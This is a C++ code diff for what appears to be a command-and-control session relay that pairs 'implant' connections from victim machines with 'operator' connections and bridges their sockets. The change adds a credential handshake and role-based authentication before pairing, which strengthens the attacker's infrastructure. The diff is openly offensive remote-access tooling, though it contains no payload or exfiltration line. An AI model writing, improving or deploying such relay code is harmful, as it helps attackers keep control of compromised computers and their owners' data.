@@ -2,6 +2,8 @@
 
 #include "Logger.hpp"
 #include "Config.hpp"
+#include "SessionConnectionAuthenticator.hpp"
+#include <SessionHandshake.hpp>
 
 #include <Remote.hpp>
 #include <Server.hpp>
@@ -28,6 +30,56 @@ private:
     std::mutex mtx;
     std::map<int64_t, std::unique_ptr<cpppwn::Remote>> waiting_operators;
     std::map<int64_t, std::unique_ptr<cpppwn::Remote>> waiting_victims;
+    SessionConnectionAuthenticator* session_auth_ = nullptr;
+
+    [[nodiscard]] bool authenticate_connection(cpppwn::Remote& conn, std::string& role_out) {
+        if (session_auth_ == nullptr) {
+            logger::error("Session authenticator is not configured");
+            return false;
+        }
+
+        std::string role;
+        const auto credentials = session_handshake::receive(conn);
+        if (!credentials.has_value()) {
+            logger::warn("Session handshake incomplete");
+            return false;
+        }
+
+        role_out = credentials->role;
+        if (!session_auth_->authenticate(credentials->role, credentials->username, credentials->password)) {
+            logger::warn("Session authentication failed for role [{}] user [{}]", credentials->role, credentials->username);
+            return false;
+        }
+
+        logger::info("Session authenticated for role [{}] user [{}]", credentials->role, credentials->username);
+        return true;
+    }
+
+    void queue_authenticated_connection(
+        std::unique_ptr<cpppwn::Remote>&& conn,
+        int64_t port,
+        const std::string& role) {
+        if (role.starts_with(session_handshake::implant_role)) {
+            if (waiting_operators.contains(port)) {
+                bridge_sockets(std::move(conn), std::move(waiting_operators[port]));
+                waiting_operators.erase(port);
+            } else {
+                waiting_victims[port] = std::move(conn);
+                logger::info("Implant linked to Port: {}", port);
+            }
+            return;
+        }
+
+        if (role.starts_with(session_handshake::operator_role)) {
+            if (waiting_victims.contains(port)) {
+                bridge_sockets(std::move(waiting_victims[port]), std::move(conn));
+                waiting_victims.erase(port);
+            } else {
+                waiting_operators[port] = std::move(conn);
+                logger::info("Operator waiting for Victim on Port: {}", port);
+            }
+        }
+    }
 
 public:
     //--------------------------------
@@ -36,6 +88,10 @@ public:
     static SessionManager& instance() {
         static SessionManager instance;
         return instance;
+    }
+
+    void set_session_authenticator(SessionConnectionAuthenticator* authenticator) {
+        session_auth_ = authenticator;
     }
 
     //--------------------------------
@@ -67,28 +123,13 @@ public:
     void handle_new_connection(std::unique_ptr<cpppwn::Remote>&& conn, int64_t port) {
         std::thread([this, conn_ptr = std::move(conn), port]() mutable -> void {
             try {
-                std::string ident = conn_ptr->recvline();
-                if (ident.empty()) return;
+                std::string role;
+                if (!authenticate_connection(*conn_ptr, role)) {
+                    return;
+                }
 
                 std::lock_guard lock(mtx);
-
-                if (ident.starts_with("IMPLANT")) {
-                    if (waiting_operators.contains(port)) {
-                        bridge_sockets(std::move(conn_ptr), std::move(waiting_operators[port]));
-                        waiting_operators.erase(port);
-                    } else {
-                        waiting_victims[port] = std::move(conn_ptr);
-                        logger::info("Implant linked to Port: {}", port);
-                    }
-                } else if (ident.starts_with("OPERATOR")) {
-                    if (waiting_victims.contains(port)) {
-                        bridge_sockets(std::move(waiting_victims[port]), std::move(conn_ptr));
-                        waiting_victims.erase(port);
-                    } else {
-                        waiting_operators[port] = std::move(conn_ptr);
-                        logger::info("Operator waiting for Victim on Port: {}", port);
-                    }
-                }
+                queue_authenticated_connection(std::move(conn_ptr), port, role);
             } catch (const std::exception& e) {
                 logger::warn("Connection handler failed: {}", e.what());
             }
